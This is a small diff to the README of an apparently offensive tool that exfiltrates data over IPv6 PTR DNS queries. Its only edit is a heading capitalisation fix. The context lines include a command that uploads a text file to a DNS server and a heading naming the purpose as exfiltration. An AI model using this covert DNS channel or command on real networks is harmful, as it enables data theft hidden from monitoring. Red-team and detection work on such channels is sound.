@@ -36,7 +36,7 @@ example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.1
 
 Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server
 
-# Using IPV6 PTR Queries for Exfil/Upload DATA
+# Using IPv6 PTR Queries for Exfil/Upload DATA
 
 ![](https://github.com/DamonMohammadbagher/NativePayload_IP6DNS/blob/master/Chapter%206%20-%20DATA%20Transferring%20Technique%20by%20DNS%20Traffic%20-%20AAAA%20Records/Pics/NativePayload_IP6DNS-Via-IPv6-PTR.png)
 
